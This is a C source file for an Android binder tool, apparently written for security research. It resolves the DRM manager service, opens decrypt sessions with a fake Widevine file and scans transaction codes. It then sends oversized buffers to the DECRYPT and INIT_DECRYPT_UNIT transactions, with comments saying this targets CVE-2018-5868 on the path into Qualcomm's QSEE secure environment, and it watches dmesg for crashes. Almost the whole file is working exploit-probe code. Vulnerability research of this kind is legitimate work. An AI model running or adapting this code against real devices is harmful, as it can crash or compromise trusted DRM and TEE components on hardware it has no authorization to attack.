/*
 * drm_session_probe.c — Probe DRM/Widevine path to QSEE via raw binder
 *
 * Properly resolves service handles from the service manager,
 * then sends DRM transactions to the actual DRM service.
 *
 * Build: aarch64-linux-musl-gcc -static -O2 drm_session_probe.c -o drm_session_probe
 * Deploy: adb push drm_session_probe /data/local/tmp/
 * Run: adb shell /data/local/tmp/drm_session_probe
 * Monitor: adb shell dmesg -w | grep -iE 'qsee|widevine|oemcrypto|crash'
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/android/binder.h>

#define BINDER_MMAP_SIZE (128 * 1024)

/* Transaction codes (verified against AOSP M IDrmManagerService.h) */
#define SVC_MGR_CHECK_SERVICE   2
#define TX_ADD_UNIQUEID         1
#define TX_GET_CONSTRAINTS      7
#define TX_CAN_HANDLE           9
#define TX_ACQUIRE_DRM_INFO    11
#define TX_GET_ORIGINAL_MIME   13
#define TX_GET_ALL_SUPPORT_INFO 24
#define TX_OPEN_DECRYPT_SESSION 25
#define TX_CLOSE_DECRYPT_SESSION 26
#define TX_DECRYPT             27
#define TX_INIT_DECRYPT_UNIT   28
#define TX_FINALIZE_DECRYPT_UNIT 29
#define TX_PREAD               30
#define TX_OPEN_DECRYPT_STREAMING 31

static int binder_fd = -1;
static void *binder_mapped = NULL;

/* ---- Parcel helpers ---- */

struct parcel {
    uint8_t data[4096];
    size_t pos;
};

static void parcel_init(struct parcel *p) {
    memset(p, 0, sizeof(*p));
}

static void parcel_write32(struct parcel *p, uint32_t v) {
    if (p->pos + 4 <= sizeof(p->data)) {
        memcpy(p->data + p->pos, &v, 4);
        p->pos += 4;
    }
}

static void parcel_write_str16(struct parcel *p, const char *s) {
    if (!s) { parcel_write32(p, 0xffffffff); return; }
    uint32_t len = strlen(s);
    parcel_write32(p, len);
    for (uint32_t i = 0; i <= len; i++) {
        uint16_t c = (i < len) ? (uint16_t)(unsigned char)s[i] : 0;
        if (p->pos + 2 <= sizeof(p->data)) {
            memcpy(p->data + p->pos, &c, 2);
            p->pos += 2;
        }
    }
    while (p->pos & 3) p->data[p->pos++] = 0;
}

static void parcel_write_iface(struct parcel *p, const char *iface) {
    parcel_write32(p, 0x100); /* strict mode */
    parcel_write_str16(p, iface);
}

static void parcel_write_bytes(struct parcel *p, const void *d, size_t n) {
    parcel_write32(p, (uint32_t)n);
    if (p->pos + n <= sizeof(p->data)) {
        memcpy(p->data + p->pos, d, n);
        p->pos += n;
    }
    while (p->pos & 3) p->data[p->pos++] = 0;
}

/* String8: 4-byte length + UTF-8 data + null + padding */
static void parcel_write_str8(struct parcel *p, const char *s) {
    if (!s) { parcel_write32(p, 0xffffffff); return; }
    uint32_t len = strlen(s);
    parcel_write32(p, len);
    if (p->pos + len + 1 <= sizeof(p->data)) {
        memcpy(p->data + p->pos, s, len + 1); /* include null */
        p->pos += len + 1;
    }
    while (p->pos & 3) p->data[p->pos++] = 0;
}

/* ---- Binder core ---- */

static int binder_open(void) {
    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        fprintf(stderr, "[-] open /dev/binder: %s\n", strerror(errno));
        return -1;
    }
    binder_mapped = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    if (binder_mapped == MAP_FAILED) {
        fprintf(stderr, "[-] mmap: %s\n", strerror(errno));
        close(binder_fd);
        return -1;
    }
    uint32_t mt = 0;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &mt);
    printf("[+] Binder fd=%d\n", binder_fd);
    return 0;
}

/*
 * binder_transact — send a transaction and get reply data + acquired handle.
 * If out_handle is non-NULL and the reply contains a binder object
 * (via BR_ACQUIRE or BR_INCREFS), the handle is stored there.
 */
/*
 * binder_transact — send a transaction and get reply data + acquired handle.
 * offsets/offsets_count: array of offsets into send->data where flat_binder_objects
 * are located (for fd passing, etc). Pass NULL/0 for normal transactions.
 */
static int binder_transact_ex(uint32_t handle, uint32_t code,
                              struct parcel *send, struct parcel *reply,
                              uint32_t *out_handle,
                              uintptr_t *offsets, size_t offsets_count) {
    struct binder_transaction_data txn;
    memset(&txn, 0, sizeof(txn));
    txn.target.handle = handle;
    txn.code = code;
    txn.data_size = send->pos;
    txn.data.ptr.buffer = (uintptr_t)send->data;
    txn.offsets_size = offsets_count * sizeof(uintptr_t);
    if (offsets_count > 0 && offsets)
        txn.data.ptr.offsets = (uintptr_t)offsets;

    /* Write: BC_TRANSACTION */
    uint8_t wbuf[sizeof(uint32_t) + sizeof(txn)];
    uint32_t cmd = BC_TRANSACTION;
    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &txn, sizeof(txn));

    uint8_t rbuf[4096];
    struct binder_write_read bwr = {0};
    bwr.write_buffer = (uintptr_t)wbuf;
    bwr.write_size = sizeof(wbuf);
    bwr.read_buffer = (uintptr_t)rbuf;
    bwr.read_size = sizeof(rbuf);

    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        fprintf(stderr, "[-] ioctl BWR: %s\n", strerror(errno));
        return -1;
    }

    /* Parse reply — may need multiple reads */
    int got_reply = 0;
    int max_reads = 5;

    while (!got_reply && max_reads-- > 0) {
        uint8_t *p = rbuf;
        size_t rem = bwr.read_consumed;

        while (rem >= 4) {
            uint32_t br;
            memcpy(&br, p, 4); p += 4; rem -= 4;

            printf("[D]   BR cmd: 0x%08x rem=%zu\n", br, rem);

            switch (br) {
            case BR_NOOP:
                break;

            case BR_TRANSACTION_COMPLETE:
                break;

            case BR_INCREFS:
            case BR_ACQUIRE: {
                /* These carry (void *ptr, void *cookie) — 2 pointers */
                if (rem >= 2 * sizeof(uintptr_t)) {
                    uintptr_t ref_ptr, ref_cookie;
                    memcpy(&ref_ptr, p, sizeof(uintptr_t));
                    memcpy(&ref_cookie, p + sizeof(uintptr_t), sizeof(uintptr_t));
                    p += 2 * sizeof(uintptr_t);
                    rem -= 2 * sizeof(uintptr_t);

                    /* Send acknowledgment */
                    uint32_t ack_cmd = (br == BR_ACQUIRE) ? BC_ACQUIRE_DONE : BC_INCREFS_DONE;
                    uint8_t ack[sizeof(uint32_t) + 2 * sizeof(uintptr_t)];
                    memcpy(ack, &ack_cmd, 4);
                    memcpy(ack + 4, &ref_ptr, sizeof(uintptr_t));
                    memcpy(ack + 4 + sizeof(uintptr_t), &ref_cookie, sizeof(uintptr_t));
                    struct binder_write_read ackwr = {0};
                    ackwr.write_buffer = (uintptr_t)ack;
                    ackwr.write_size = sizeof(ack);
                    ioctl(binder_fd, BINDER_WRITE_READ, &ackwr);
                }
                break;
            }

            case BR_REPLY: {
                if (rem < sizeof(struct binder_transaction_data)) {
                    fprintf(stderr, "[-] BR_REPLY truncated\n");
                    return -1;
                }
                struct binder_transaction_data rtxn;
                memcpy(&rtxn, p, sizeof(rtxn));
                p += sizeof(rtxn);
                rem -= sizeof(rtxn);

                printf("[D] BR_REPLY: data_size=%llu offsets_size=%llu flags=0x%x\n",
                       (unsigned long long)rtxn.data_size,
                       (unsigned long long)rtxn.offsets_size,
                       rtxn.flags);

                /* Check for status reply */
                if (rtxn.flags & 0x02 /* TF_STATUS_CODE */) {
                    int32_t st = 0;
                    if (rtxn.data_size >= 4)
                        memcpy(&st, (void*)(uintptr_t)rtxn.data.ptr.buffer, 4);
                    fprintf(stderr, "[-] Status reply: %d\n", st);
                } else if (rtxn.data_size > 0 && reply) {
                    size_t cs = rtxn.data_size;
                    if (cs > sizeof(reply->data)) cs = sizeof(reply->data);
                    memcpy(reply->data, (void*)(uintptr_t)rtxn.data.ptr.buffer, cs);
                    reply->pos = cs;

                    /* If the reply has offsets, look for binder handle */
                    if (rtxn.offsets_size > 0 && out_handle) {
                        uintptr_t *offsets = (uintptr_t*)(uintptr_t)rtxn.data.ptr.offsets;
                        size_t noff = rtxn.offsets_size / sizeof(uintptr_t);
                        for (size_t i = 0; i < noff; i++) {
                            struct flat_binder_object *fbo =
                                (struct flat_binder_object *)
                                ((uint8_t*)(uintptr_t)rtxn.data.ptr.buffer + offsets[i]);
                            if (fbo->hdr.type == BINDER_TYPE_HANDLE ||
                                fbo->hdr.type == BINDER_TYPE_WEAK_HANDLE) {
                                *out_handle = fbo->handle;
                                printf("[+] Got binder handle: %u\n", fbo->handle);

                                /* CRITICAL: Acquire our own reference to the handle
                                 * BEFORE freeing the buffer (which drops the driver's ref).
                                 * Send BC_INCREFS + BC_ACQUIRE to add strong+weak refs. */
                                uint8_t acq[4 + 4 + 4 + 4]; /* 2 commands, each with uint32 handle */
                                uint32_t c1 = BC_INCREFS;
                                uint32_t c2 = BC_ACQUIRE;
                                uint32_t hv = fbo->handle;
                                memcpy(acq, &c1, 4);
                                memcpy(acq + 4, &hv, 4);
                                memcpy(acq + 8, &c2, 4);
                                memcpy(acq + 12, &hv, 4);
                                struct binder_write_read awr = {0};
                                awr.write_buffer = (uintptr_t)acq;
                                awr.write_size = sizeof(acq);
                                /* Write-only — don't block on read */
                                ioctl(binder_fd, BINDER_WRITE_READ, &awr);
                                printf("[+] Acquired ref for handle %u\n", fbo->handle);
                            }
                        }
                    }
                }

                /* Free buffer (safe now — we hold our own ref) */
                {
                    uint8_t fb[sizeof(uint32_t) + sizeof(uintptr_t)];
                    uint32_t fc = BC_FREE_BUFFER;
                    uintptr_t fp = (uintptr_t)rtxn.data.ptr.buffer;
                    memcpy(fb, &fc, 4);
                    memcpy(fb + 4, &fp, sizeof(fp));
                    struct binder_write_read fbwr = {0};
                    fbwr.write_buffer = (uintptr_t)fb;
                    fbwr.write_size = sizeof(fb);
                    ioctl(binder_fd, BINDER_WRITE_READ, &fbwr);
                }

                got_reply = 1;
                break;
            }

            case BR_FAILED_REPLY:
                fprintf(stderr, "[-] BR_FAILED_REPLY (rem=%zu)\n", rem);
                /* Dump remaining buffer for debugging */
                if (rem > 0) {
                    fprintf(stderr, "[D] remaining: ");
                    for (size_t di = 0; di < rem && di < 32; di++)
                        fprintf(stderr, "%02x ", p[di]);
                    fprintf(stderr, "\n");
                }
                return -1;

            case BR_DEAD_REPLY:
                fprintf(stderr, "[-] BR_DEAD_REPLY\n");
                return -1;

            default:
                /* Skip unknown — hope it has no payload */
                break;
            }
        }

        if (!got_reply) {
            /* Need another read */
            memset(&bwr, 0, sizeof(bwr));
            bwr.read_buffer = (uintptr_t)rbuf;
            bwr.read_size = sizeof(rbuf);
            if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) return -1;
        }
    }

    return got_reply ? 0 : -1;
}

static int binder_transact(uint32_t handle, uint32_t code,
                           struct parcel *send, struct parcel *reply,
                           uint32_t *out_handle) {
    return binder_transact_ex(handle, code, send, reply, out_handle, NULL, 0);
}

/* ---- Service Manager ---- */

static uint32_t lookup_service(const char *name) {
    struct parcel send, reply;
    uint32_t handle = 0;

    parcel_init(&send);
    /* Service manager expects: strict_policy (uint32), then interface token, then name */
    parcel_write32(&send, 0);  /* strict_policy */
    parcel_write_str16(&send, "android.os.IServiceManager");
    parcel_write_str16(&send, name);

    parcel_init(&reply);

    printf("[*] Looking up: %s\n", name);
    if (binder_transact(0, SVC_MGR_CHECK_SERVICE, &send, &reply, &handle) < 0) {
        fprintf(stderr, "[-] Service lookup failed\n");
        return 0;
    }

    if (handle > 0) {
        printf("[+] Resolved %s → handle %u\n", name, handle);
        return handle;
    }

    /* Fallback: try to find handle in reply data */
    if (reply.pos >= sizeof(struct flat_binder_object)) {
        struct flat_binder_object *fbo = (struct flat_binder_object *)reply.data;
        if (fbo->hdr.type == BINDER_TYPE_HANDLE || fbo->hdr.type == BINDER_TYPE_WEAK_HANDLE) {
            printf("[+] Resolved %s → handle %u (from data)\n", name, fbo->handle);
            return fbo->handle;
        }
    }

    /* Last resort: dump reply for debugging */
    printf("[*] Reply (%zu bytes): ", reply.pos);
    for (size_t i = 0; i < reply.pos && i < 64; i++)
        printf("%02x ", reply.data[i]);
    printf("\n");

    return 0;
}

/* ---- Hex dump ---- */

static void hexdump(const char *label, const void *data, size_t len) {
    const uint8_t *p = data;
    printf("[*] %s (%zu bytes):\n", label, len);
    for (size_t i = 0; i < len && i < 256; i++) {
        if (i % 16 == 0) printf("  %04zx: ", i);
        printf("%02x ", p[i]);
        if (i % 16 == 15 || i == len - 1) {
            for (size_t j = i % 16; j < 15; j++) printf("   ");
            printf(" ");
            size_t start = i - (i % 16);
            for (size_t j = start; j <= i; j++)
                printf("%c", (p[j] >= 0x20 && p[j] < 0x7f) ? p[j] : '.');
            printf("\n");
        }
    }
}

/* ---- DRM operations ---- */

static int drm_add_uniqueid(uint32_t h, int *out_id) {
    struct parcel send, reply;
    parcel_init(&send);
    parcel_write_iface(&send, "drm.IDrmManagerService");

    hexdump("TX 1 parcel", send.data, send.pos);

    parcel_init(&reply);
    printf("[*] TX 1: ADD_UNIQUEID (handle=%u)\n", h);
    if (binder_transact(h, TX_ADD_UNIQUEID, &send, &reply, NULL) < 0) return -1;
    if (reply.pos >= 4) {
        uint32_t id;
        memcpy(&id, reply.data, 4);
        printf("[+] Unique ID: %u (0x%x)\n", id, id);
        if (out_id) *out_id = (int)id;
        return 0;
    }
    return -1;
}

static int drm_can_handle(uint32_t h, int uid, const char *path, const char *mime) {
    struct parcel send, reply;
    parcel_init(&send);
    parcel_write_iface(&send, "drm.IDrmManagerService");
    parcel_write32(&send, (uint32_t)uid);
    parcel_write_str16(&send, path);
    parcel_write_str16(&send, mime);

    parcel_init(&reply);
    printf("[*] TX 9: CAN_HANDLE '%s' / '%s'\n", path, mime);
    if (binder_transact(h, TX_CAN_HANDLE, &send, &reply, NULL) < 0) return -1;
    if (reply.pos >= 4) {
        uint32_t v;
        memcpy(&v, reply.data, 4);
        printf("[+] CAN_HANDLE result: %u\n", v);
        return (int)v;
    }
    return -1;
}

static int drm_get_support_info(uint32_t h, int uid) {
    struct parcel send, reply;
    parcel_init(&send);
    parcel_write_iface(&send, "drm.IDrmManagerService");
    parcel_write32(&send, (uint32_t)uid);

    parcel_init(&reply);
    printf("[*] TX 24: GET_ALL_SUPPORT_INFO\n");
    if (binder_transact(h, TX_GET_ALL_SUPPORT_INFO, &send, &reply, NULL) < 0) return -1;
    if (reply.pos > 0) {
        hexdump("DRM plugins", reply.data, reply.pos);
        return 0;
    }
    return -1;
}

static int drm_acquire_info(uint32_t h, int uid) {
    struct parcel send, reply;
    parcel_init(&send);
    parcel_write_iface(&send, "drm.IDrmManagerService");
    parcel_write32(&send, (uint32_t)uid);

    /* DrmInfoRequest: infoType=3 (REGISTRATION_INFO), mimeType */
    parcel_write32(&send, 3);
    parcel_write_str16(&send, "video/wvm");

    /* Key-value pairs count */
    parcel_write32(&send, 1);
    parcel_write_str16(&send, "WVDRMServerKey");
    parcel_write_str16(&send, "https://test.example.com/proxy");

    parcel_init(&reply);
    printf("[*] TX 11: ACQUIRE_DRM_INFO (Widevine registration)\n");
    if (binder_transact(h, TX_ACQUIRE_DRM_INFO, &send, &reply, NULL) < 0) return -1;
    if (reply.pos > 0) {
        hexdump("ACQUIRE_DRM_INFO reply", reply.data, reply.pos);
        return 0;
    }
    return -1;
}

/*
 * Write a file descriptor into a parcel.
 * Android's Parcel::writeFileDescriptor writes:
 *   int32_t has_fd = 1
 *   flat_binder_object { type=BINDER_TYPE_FD, handle=fd, cookie=0 }
 * and records the offset.
 */
static size_t parcel_fd_offset = 0; /* track where the fbo is for offsets */

static void parcel_write_fd(struct parcel *p, int fd) {
    parcel_fd_offset = p->pos; /* remember offset for flat_binder_object */
    struct flat_binder_object fbo;
    memset(&fbo, 0, sizeof(fbo));
    fbo.hdr.type = BINDER_TYPE_FD;
    fbo.flags = 0x17f; /* FLAT_BINDER_FLAG_PRIORITY_MASK | FLAT_BINDER_FLAG_ACCEPTS_FDS */
    fbo.handle = fd;
    fbo.cookie = 0; /* not taking ownership */
    if (p->pos + sizeof(fbo) <= sizeof(p->data)) {
        memcpy(p->data + p->pos, &fbo, sizeof(fbo));
        p->pos += sizeof(fbo);
    }
    while (p->pos & 3) p->data[p->pos++] = 0;
}

/* Create a minimal fake WVM file for decrypt session opening */
static int create_fake_wvm(const char *path) {
    int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd < 0) return -1;
    /* WVM header magic: first 4 bytes */
    uint8_t wvm_header[64];
    memset(wvm_header, 0, sizeof(wvm_header));
    /* Widevine .wvm container header */
    wvm_header[0] = 0x01; /* version */
    wvm_header[1] = 0x77; /* 'w' */
    wvm_header[2] = 0x76; /* 'v' */
    wvm_header[3] = 0x6d; /* 'm' */
    write(fd, wvm_header, sizeof(wvm_header));
    close(fd);
    return 0;
}

static int drm_open_decrypt_session(uint32_t h, int uid) {
    struct parcel send, reply;

    /* First create a fake WVM file */
    const char *wvm_path = "/data/local/tmp/test.wvm";
    create_fake_wvm(wvm_path);

    int fd = open(wvm_path, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[-] Cannot open %s: %s\n", wvm_path, strerror(errno));
        return -1;
    }
    printf("[+] Opened %s as fd %d\n", wvm_path, fd);

    parcel_init(&send);
    parcel_write_iface(&send, "drm.IDrmManagerService");
    parcel_write32(&send, (uint32_t)uid);

    /* OPEN_DECRYPT_SESSION: uniqueId, fd, offset(int64), length(int64), mime(String8) */
    parcel_write_fd(&send, fd);
    parcel_write32(&send, 0);  /* offset low */
    parcel_write32(&send, 0);  /* offset high */
    parcel_write32(&send, 64); /* length low */
    parcel_write32(&send, 0);  /* length high */
    parcel_write_str8(&send, "video/wvm");

    hexdump("TX 25 parcel", send.data, send.pos);

    /* Set up offsets for the flat_binder_object */
    uintptr_t fd_off = parcel_fd_offset;

    parcel_init(&reply);
    printf("[*] TX 25: OPEN_DECRYPT_SESSION (video/wvm, fd=%d)\n", fd);
    int ret = binder_transact_ex(h, TX_OPEN_DECRYPT_SESSION, &send, &reply, NULL, &fd_off, 1);

    if (ret < 0) {
        printf("[-] OPEN_DECRYPT_SESSION failed\n");
    } else if (reply.pos > 0) {
        hexdump("OPEN_DECRYPT_SESSION reply", reply.data, reply.pos);
    } else {
        printf("[-] OPEN_DECRYPT_SESSION: empty reply\n");
    }

    close(fd);
    return ret;
}

/* TX 26 = CLOSE_DECRYPT_SESSION in AOSP M */
/* TX 31 = OPEN_DECRYPT_SESSION_FOR_STREAMING — also needs fd */

/* Scan TX codes 25-35 to find the correct mapping on BB */
static void drm_scan_tx_codes(uint32_t h, int uid) {
    printf("[*] Scanning TX codes 25-35 for valid responses...\n");
    for (uint32_t tx = 25; tx <= 35; tx++) {
        struct parcel send, reply;
        parcel_init(&send);
        parcel_write_iface(&send, "drm.IDrmManagerService");
        parcel_write32(&send, (uint32_t)uid);
        parcel_write32(&send, 0); /* dummy arg */

        parcel_init(&reply);
        int ret = binder_transact(h, tx, &send, &reply, NULL);
        if (ret == 0) {
            printf("  TX %u: reply %zu bytes", tx, reply.pos);
            if (reply.pos >= 4) {
                int32_t v;
                memcpy(&v, reply.data, 4);
                printf(" [first int32: %d / 0x%x]", v, v);
            }
            printf("\n");
        } else {
            printf("  TX %u: FAILED\n", tx);
        }
    }
}

/*
 * Send oversized buffer to DECRYPT (TX 27) — targeting CVE-2018-5868
 *
 * AOSP M BnDrmManagerService::onTransact DECRYPT format:
 *   int32 uniqueId
 *   DecryptHandle (readDecryptHandleFromParcelData):
 *     int32 decryptId
 *     String8 mimeType
 *     int32 decryptApiType
 *     int32 status
 *     int32 numCopyControlData (should be 0 for now)
 *   int32 decryptUnitId
 *   int32 decBufferLength
 *   int32 encBufferLength
 *   byte[encBufferLength] encData
 *   int32 hasIV
 *   [if hasIV: int32 ivLength, byte[ivLength] iv]
 */
static int drm_fuzz_decrypt(uint32_t h, int uid, size_t payload_size) {
    struct parcel send, reply;
    parcel_init(&send);
    parcel_write_iface(&send, "drm.IDrmManagerService");
    parcel_write32(&send, (uint32_t)uid);

    /* DecryptHandle */
    parcel_write32(&send, 1);           /* decryptId (fake, non-zero) */
    parcel_write_str8(&send, "video/wvm"); /* mimeType */
    parcel_write32(&send, 1);           /* decryptApiType (1 = CONTAINER_BASED) */
    parcel_write32(&send, 1);           /* status (1 = RIGHTS_VALID) */
    parcel_write32(&send, 0);           /* numCopyControlData */

    /* decryptUnitId */
    parcel_write32(&send, 0);

    /* decBufferLength (output buffer size) */
    parcel_write32(&send, (uint32_t)payload_size);

    /* encBufferLength + data — this is the oversized payload */
    parcel_write32(&send, (uint32_t)payload_size);
    if (payload_size > 0 && send.pos + payload_size <= sizeof(send.data)) {
        memset(send.data + send.pos, 'A', payload_size);
        send.pos += payload_size;
        while (send.pos & 3) send.data[send.pos++] = 0;
    }

    /* IV */
    parcel_write32(&send, 1); /* hasIV = true */
    parcel_write32(&send, 16); /* ivLength */
    memset(send.data + send.pos, 0, 16);
    send.pos += 16;

    parcel_init(&reply);
    printf("[*] TX 27: DECRYPT (payload=%zu bytes)\n", payload_size);
    int ret = binder_transact(h, TX_DECRYPT, &send, &reply, NULL);
    if (ret < 0) {
        printf("[!] DECRYPT failed — check dmesg for crash!\n");
    } else if (reply.pos > 0) {
        hexdump("DECRYPT reply", reply.data, reply.pos > 64 ? 64 : reply.pos);
    } else {
        printf("[*] Empty reply (no data)\n");
    }
    return ret;
}

/* Also fuzz INITIALIZE_DECRYPT_UNIT (TX 28) — different path to QSEE */
static int drm_fuzz_init_decrypt(uint32_t h, int uid, size_t payload_size) {
    struct parcel send, reply;
    parcel_init(&send);
    parcel_write_iface(&send, "drm.IDrmManagerService");
    parcel_write32(&send, (uint32_t)uid);

    /* DecryptHandle (same format) */
    parcel_write32(&send, 1);           /* decryptId */
    parcel_write_str8(&send, "video/wvm");
    parcel_write32(&send, 1);           /* decryptApiType */
    parcel_write32(&send, 1);           /* status */
    parcel_write32(&send, 0);           /* numCopyControlData */

    /* decryptUnitId */
    parcel_write32(&send, 0);

    /* Header data — oversized buffer */
    parcel_write32(&send, (uint32_t)payload_size);
    if (payload_size > 0 && send.pos + payload_size <= sizeof(send.data)) {
        memset(send.data + send.pos, 'B', payload_size);
        send.pos += payload_size;
        while (send.pos & 3) send.data[send.pos++] = 0;
    }

    parcel_init(&reply);
    printf("[*] TX 28: INIT_DECRYPT_UNIT (payload=%zu bytes)\n", payload_size);
    int ret = binder_transact(h, TX_INIT_DECRYPT_UNIT, &send, &reply, NULL);
    if (ret < 0) {
        printf("[!] INIT_DECRYPT_UNIT failed — check dmesg for crash!\n");
    } else if (reply.pos > 0) {
        hexdump("INIT_DECRYPT_UNIT reply", reply.data, reply.pos > 64 ? 64 : reply.pos);
    } else {
        printf("[*] Empty reply\n");
    }
    return ret;
}

/* ---- Main ---- */

int main(void) {
    printf("=== DRM/Widevine QSEE Probe v2 ===\n\n");

    if (binder_open() < 0) return 1;

    /* Resolve DRM service handle */
    uint32_t drm_handle = lookup_service("drm.drmManager");
    if (drm_handle == 0) {
        fprintf(stderr, "[-] Could not resolve drm.drmManager handle\n");
        fprintf(stderr, "[*] Trying handle guessing (1-10)...\n");

        /* Fallback: try common handle values */
        for (uint32_t try_h = 1; try_h <= 10; try_h++) {
            struct parcel send, reply;
            parcel_init(&send);
            parcel_write_iface(&send, "drm.IDrmManagerService");

            parcel_init(&reply);
            if (binder_transact(try_h, TX_ADD_UNIQUEID, &send, &reply, NULL) == 0
                && reply.pos >= 4) {
                uint32_t v;
                memcpy(&v, reply.data, 4);
                if (v != 0xffffffff && v > 0 && v < 100000) {
                    printf("[+] Handle %u responds to ADD_UNIQUEID (id=%u)\n", try_h, v);
                    drm_handle = try_h;
                    break;
                }
            }
        }

        if (drm_handle == 0) {
            fprintf(stderr, "[-] All handle guesses failed\n");
            return 1;
        }
    }

    /* Verify handle with PING_TRANSACTION */
    {
        struct parcel psend, preply;
        parcel_init(&psend);
        parcel_init(&preply);
        printf("[*] PING handle %u...\n", drm_handle);
        int pr = binder_transact(drm_handle, 0x5f504e47 /* PING */, &psend, &preply, NULL);
        printf("[*] PING result: %d, reply %zu bytes\n", pr, preply.pos);
    }

    /* Also try looking up another service for comparison */
    {
        uint32_t sf_handle = lookup_service("SurfaceFlinger");
        if (sf_handle > 0) {
            struct parcel psend, preply;
            parcel_init(&psend);
            parcel_init(&preply);
            printf("[*] PING SurfaceFlinger handle %u...\n", sf_handle);
            int pr = binder_transact(sf_handle, 0x5f504e47, &psend, &preply, NULL);
            printf("[*] SF PING result: %d, reply %zu bytes\n", pr, preply.pos);
        }
    }

    printf("\n--- DRM Service Operations ---\n\n");

    /* Get a unique ID */
    int uid = 0;
    drm_add_uniqueid(drm_handle, &uid);

    /* Check Widevine support */
    drm_can_handle(drm_handle, uid, "test.wvm", "video/wvm");

    /* Get plugin info */
    drm_get_support_info(drm_handle, uid);

    /* Try to acquire DRM info (Widevine provisioning — may reach QSEE) */
    drm_acquire_info(drm_handle, uid);

    /* Try to open decrypt session */
    drm_open_decrypt_session(drm_handle, uid);

    /* Scan TX codes to verify our mapping */
    drm_scan_tx_codes(drm_handle, uid);

    printf("\n--- Fuzzing DECRYPT TX 27 (CVE-2018-5868 probe) ---\n\n");

    /* Send progressively larger payloads to DECRYPT */
    size_t sizes[] = { 16, 256, 1024, 2048 };
    for (size_t i = 0; i < sizeof(sizes)/sizeof(sizes[0]); i++) {
        drm_fuzz_decrypt(drm_handle, uid, sizes[i]);
        usleep(100000); /* 100ms between attempts */
    }

    printf("\n--- Fuzzing INIT_DECRYPT_UNIT TX 28 ---\n\n");

    /* Also fuzz INITIALIZE_DECRYPT_UNIT (different code path) */
    size_t sizes2[] = { 16, 256, 1024 };
    for (size_t i = 0; i < sizeof(sizes2)/sizeof(sizes2[0]); i++) {
        drm_fuzz_init_decrypt(drm_handle, uid, sizes2[i]);
        usleep(100000);
    }

    printf("\n[*] Done. Check dmesg:\n");
    printf("[*]   dmesg | grep -iE 'qsee|widevine|oemcrypto|crash|oops|panic'\n");

    munmap(binder_mapped, BINDER_MMAP_SIZE);
    close(binder_fd);
    return 0;
}
